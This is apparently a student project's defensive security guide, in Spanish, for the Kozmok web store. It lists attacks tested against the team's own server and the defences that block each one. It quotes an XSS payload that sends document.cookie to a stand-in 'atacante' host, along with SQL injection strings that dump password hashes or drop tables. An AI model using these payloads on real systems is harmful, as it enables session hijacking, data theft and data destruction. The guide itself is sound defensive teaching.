# Seguridad de Kozmok (Etapa 5)

Guía para la **defensa**: qué ataques se prueban, cómo se hacen contra nuestro propio servidor y qué defensa los detiene. Todo se puede demostrar en vivo con los scripts de `kozmok/pruebas-seguridad/` o a mano con el navegador, `curl` o Postman.

> Los ataques se hacen **solo contra nuestro propio servidor**: en la misma computadora (`http://localhost:3000`) o en la red local, por ejemplo por Wi-Fi o por el hotspot de un celular (`http://192.168.x.x:3000`). Los scripts se niegan a atacar cualquier otra dirección si no se les pasa `--objetivo-propio`.

## Resumen

| Ataque | Qué intenta el atacante | Qué lo detiene | Dónde se ve |
|---|---|---|---|
| **Fuerza bruta** | Probar muchas contraseñas hasta atinarle | Bloqueo de la cuenta tras 5 fallos (15 min), bloqueo de IP tras 20 fallos (30 min), máximo 15 intentos por minuto, retraso progresivo, bcrypt | Panel → Cuenta → **Seguridad** (Intentos y Bloqueos) |
| **Relleno de credenciales** | Una contraseña filtrada contra muchas cuentas | Límite por conexión y bloqueo de IP | Seguridad → Intentos (IPs con más fallos) |
| **Robo de sesión** | Copiar la cookie y usarla en otro navegador | Cookie HttpOnly + SameSite=Strict, token aleatorio guardado como hash, sesión atada al navegador, vencimiento, revocación al salir | Seguridad → Eventos (“Sesión robada”) |
| **Token falsificado** | Fabricar el token (la versión anterior usaba Base64 `cliente:1:…`) | Tokens aleatorios de 256 bits validados contra la tabla `sesiones` | Seguridad → Eventos (“Token falso”) |
| **Robo de credenciales por XSS** | Meter `<script>` o `<img onerror>` para leer la cookie | Limpieza de HTML en toda entrada, escape al mostrar, CSP `connect-src 'self'`, cookie HttpOnly | Seguridad → Eventos (“XSS”) |
| **Robo de la base de datos** | Llevarse la tabla de clientes | Contraseñas con bcrypt; sesiones y enlaces de recuperación solo como hash SHA-256 | — |
| **Inyección SQL** | `' OR '1'='1`, `UNION SELECT`, `; DROP TABLE` | Consultas parametrizadas en todo el servidor + filtro que bloquea y registra + ids numéricos validados + errores de la base ocultos | Seguridad → Eventos (“Inyección SQL”) |
| **CSRF** | Que otro sitio mande una petición con la sesión de la víctima | Cookie SameSite=Strict y verificación del `Origin` | Seguridad → Eventos (“CSRF”) |
| **IDOR** | Cambiar el id de la URL para ver datos de otro cliente | Cada ruta compara el id con el de la sesión | Seguridad → Eventos (“Acceso a datos ajenos”) |

## Cómo correr las pruebas

Con el servidor encendido (`npm start` dentro de `kozmok/`), en otra terminal:

```bash
cd kozmok
```

```bash
npm run prueba:seguridad
```

Corre las tres pruebas en orden y al final levanta los bloqueos que quedaron. Cada línea dice **✔ DEFENDIDO** o **✘ VULNERABLE**. También se pueden correr por separado:

```bash
npm run prueba:fuerza-bruta
```

```bash
npm run prueba:sqli
```

```bash
npm run prueba:sesion
```

Después de una demostración, para quitar bloqueos de cuentas e IPs (por ejemplo si la IP de la computadora quedó bloqueada):

```bash
npm run desbloquear
```

`npm run desbloquear -- --todo` además borra la bitácora de intentos y eventos para empezar la demo en limpio.

### Atacar por Wi-Fi desde otra computadora (más realista)

Así el ataque viaja por la red, como el de un atacante de verdad, y en el panel se ve la IP de la computadora atacante.

1. **Servidor:** conecta su computadora a una red Wi-Fi o al **hotspot de un celular** (sirve con los datos móviles: la red local la crea el celular) y corre `npm start`. La consola muestra la dirección, por ejemplo `http://192.168.43.20:3000`. En Windows permite Node.js en *Redes privadas* cuando salga el aviso del Firewall.
2. **Atacante:** otra computadora conectada a **la misma red**, con Node.js 18+ y una copia del repositorio (no hace falta `npm install`). Dentro de `kozmok/`:

```bash
node pruebas-seguridad/todas.js http://192.168.43.20:3000
```

(o cada una: `node pruebas-seguridad/1-fuerza-bruta.js http://192.168.43.20:3000 --ip`).

3. **Proyector:** en la computadora del servidor abre el panel → *Cuenta → Seguridad*: aparecen los intentos, el bloqueo de la cuenta (y de la IP con `--ip`), la inyección SQL y la sesión robada, con la IP del atacante.

Desde la otra computadora no se puede tocar la base del servidor, así que la comprobación "si se roban la base de datos" se omite y los bloqueos no se levantan solos: al terminar, corre `npm run desbloquear` en el servidor o usa **Desbloquear** en *Seguridad → Bloqueos*.

> Solo funciona dentro de la misma red. Desde internet (otro celular con sus datos móviles, fuera del hotspot) no se llega al servidor: la compañía telefónica no deja entrar conexiones a los celulares, y abrir el servidor a internet no es parte de la demo.

## 1. Fuerza bruta

**Ataque.** `pruebas-seguridad/1-fuerza-bruta.js` prueba un diccionario de contraseñas contra `diego@correo.com`; la contraseña correcta va al final. Con `--ip` también hace *relleno de credenciales*: la misma contraseña contra 25 cuentas.

```bash
node pruebas-seguridad/1-fuerza-bruta.js --cuenta=diego@correo.com --ip
```

**Qué se ve.** Los primeros intentos regresan 401 y avisan cuántos quedan; el 5º responde **429: cuenta bloqueada 15 minutos**, y aunque después llegue la contraseña correcta, **no entra**. En la ráfaga contra muchas cuentas aparece el límite por minuto (429) y la IP queda bloqueada.

**A mano.** En `/login.html` escribe 5 veces mal la contraseña de una cuenta: el mensaje cambia a “Cuenta bloqueada temporalmente…”. En el panel, *Seguridad → Bloqueos*, aparece el bloqueo con el botón **Desbloquear**.

**Defensas (en `kozmok/seguridad.js`).**
- `registrarFallo`: cada intento queda en `intentos_login`; con 5 fallos seguidos de una cuenta se crea un registro en `bloqueos` (tipo cuenta) y con 20 desde una IP, otro (tipo IP).
- `limitador`: máximo 15 peticiones por minuto por IP a login, registro y recuperación (en memoria).
- Retraso progresivo de 250 ms por fallo y bcrypt (costo 12) hacen lento cada intento.
- `compararPassword` usa un hash de relleno cuando el correo no existe: misma respuesta y mismo tiempo, así no se puede saber qué correos están registrados.
- Política de contraseñas (8+ caracteres, mayúsculas y minúsculas, número, símbolo, no de las más comunes, sin el correo ni el nombre).

Los límites se ajustan en `.env`: `MAX_FALLOS_CUENTA`, `MAX_FALLOS_IP`, `BLOQUEO_CUENTA_MIN`, `BLOQUEO_IP_MIN`.

## 2. Robo de credenciales y de sesión

**Ataque.** `pruebas-seguridad/3-robo-de-sesion.js`:
1. Fabrica un token Base64 `cliente:1:…` (con la versión anterior eso bastaba para entrar a cualquier cuenta).
2. Inicia sesión como la víctima, copia su cookie `kz_sesion` y la usa con otro navegador.
3. Cierra sesión y vuelve a usar la cookie copiada.
4. Manda un ticket con `<img src=x onerror="fetch('https://atacante/?c='+document.cookie)">`.
5. Manda una recarga del monedero con `Origin: https://sitio-malicioso`.
6. Pide el perfil, el carrito y los pedidos de otro cliente.
7. Lee la base: la contraseña solo está como hash bcrypt.

**Qué se ve.** Todo regresa 401/403. En el paso 2, además, **la sesión de la víctima se revoca**: el servidor asume que la cookie fue robada.

**A mano (robo de cookie).** Inicia sesión en Chrome, abre las herramientas de desarrollador → Application → Cookies y copia `kz_sesion`. En la consola escribe `document.cookie`: la cookie **no aparece** (HttpOnly). Pégala en otro navegador o en Postman con otro User-Agent: responde 401 y en *Seguridad → Eventos* aparece “Sesión robada”.

**Defensas.**
- La sesión es un token aleatorio de 256 bits en una cookie `HttpOnly; SameSite=Strict` (y `Secure` con `COOKIE_SEGURA=1` en HTTPS). En `localStorage` ya no hay tokens.
- En la tabla `sesiones` solo está el **hash SHA-256** del token; con una copia de la base no se pueden usar.
- Cada sesión guarda la huella del navegador que la abrió; si llega desde otro, se rechaza y se revoca.
- Vencen (7 días la tienda, 8 h el panel), se cierran por inactividad (2 días / 2 horas), se revocan al cerrar sesión, al cambiar o restablecer la contraseña. El cliente ve y cierra sus sesiones en **Mi cuenta → Seguridad**.
- Recuperación de contraseña con enlace de un solo uso que vence en 30 min, sin revelar si el correo existe.
- Contra XSS: `sanitizarEntrada` quita etiquetas y caracteres peligrosos de todo lo que entra (menos contraseñas), las pantallas escapan con `escHTML()` lo que muestran, y la cabecera **CSP** con `connect-src 'self'` impide que un script mande datos a otro servidor. También `X-Frame-Options: DENY`, `nosniff` y `Referrer-Policy`.
- Contra CSRF: cookie `SameSite=Strict` y `verificarOrigen` rechaza peticiones que modifican datos desde otro origen.
- Contra IDOR: `mismoCliente` y las consultas con `AND cliente_id = $2`; el detalle de pedidos, que antes era público, ahora exige sesión y ser el dueño.

## 3. Inyección SQL

**Ataque.** `pruebas-seguridad/2-inyeccion-sql.js` prueba:
- Login con `admin@kozmok.mx' OR '1'='1' --` y contraseñas con `' OR '1'='1`.
- Buscador con `' UNION SELECT id, email, password_hash FROM usuarios --`, `'; DROP TABLE clientes; --` y `' AND pg_sleep(5) --`.
- Ids en la URL: `/api/catalogo/1 OR 1=1`, `/api/catalogo/1;DROP TABLE productos`.
- `ORDER BY` manipulado.

**Qué se ve.** El filtro responde **400: “se detectó un intento de inyección SQL”** y lo registra. Al final la prueba confirma que el catálogo sigue completo.

**Demostrar que la defensa real son las consultas parametrizadas.** Arranca el servidor con el filtro solo registrando:

```bash
FILTRO_SQLI=registrar npm start
```

(en Windows pon `FILTRO_SQLI=registrar` en el archivo `.env`). Vuelve a correr `npm run prueba:sqli`: ahora el buscador responde 200 con **cero resultados** (el texto se buscó literalmente), el login responde “formato no válido” y nada se borra. Ningún dato interno ni error de PostgreSQL llega al atacante.

**Defensas.**
- **Consultas parametrizadas**: en `server.js` todo valor del usuario va como `$1, $2…` en `pool.query(sql, [valores])`. Lo único que se arma con texto son condiciones con marcadores y valores de listas blancas (por ejemplo, el `ORDER BY` del catálogo solo puede ser por nombre o por novedades: cualquier otro valor se ignora).
- `filtroInyeccionSQL`: detecta tautologías, `UNION SELECT`, consultas apiladas, comentarios, `pg_sleep`, lectura de `information_schema`, etc.
- `app.param`: todo `:id` debe ser numérico.
- `asyncRoute` y `mensajeSeguro`: el error de la base nunca se manda al cliente (antes la respuesta incluía `detalle: err.message`).
- Validación de formatos (correo, teléfono, montos, fechas) antes de consultar.

## Dónde está cada cosa

| Archivo | Qué contiene |
|---|---|
| `kozmok/seguridad.js` | Cabeceras/CSP, límites, bloqueos, sesiones, filtros SQL y XSS, política de contraseñas |
| `kozmok/server.js` | Rutas `/api/auth/*`, uso de los middlewares, rutas del panel `/api/admin/seguridad/*` |
| `kozmok/db/database.sql` | Tablas `sesiones`, `intentos_login`, `bloqueos`, `eventos_seguridad`, `recuperaciones`, `correos_salida` |
| `kozmok/public/admin/seguridad.html` | Tablero (Panel → Cuenta → Seguridad, solo administrador): eventos, intentos, bloqueos, sesiones activas y correos enviados |
| `kozmok/public/seguridad.html` | Seguridad de la cuenta del cliente: contraseña, sesiones y actividad |
| `kozmok/public/recuperar.html`, `restablecer.html` | Recuperar la contraseña con enlace de un solo uso |
| `kozmok/pruebas-seguridad/` | Scripts de los ataques y `desbloquear.js` |
| `kozmok/.env.example` | Contraseña de la base y parámetros de seguridad (el `.env` real no se sube) |

## Limitaciones honestas

- El proyecto corre en HTTP local; en producción debe ir con HTTPS (`COOKIE_SEGURA=1` agrega `Secure` y HSTS).
- El límite por minuto vive en memoria: se reinicia con el servidor. Los bloqueos de cuenta e IP sí quedan en la base.
- Un atacante puede bloquear a propósito la cuenta de alguien fallando 5 veces (es el costo del bloqueo); por eso dura solo 15 minutos y la persona puede entrar con “¿Olvidaste tu contraseña?”, que además levanta el bloqueo.
- Los correos no salen a internet: se guardan en el panel, *Cuenta → Seguridad → Correos enviados* (ahí está el enlace de recuperación durante la demo).
- La CSP todavía permite scripts escritos dentro del HTML (`'unsafe-inline'`) porque las pantallas los usan. Contra XSS la defensa principal es limpiar lo que entra y escapar lo que se muestra; la CSP evita que un script inyectado mande datos a otro servidor (`connect-src 'self'`). El siguiente paso sería pasar esos scripts a archivos `.js` y quitar `'unsafe-inline'`.
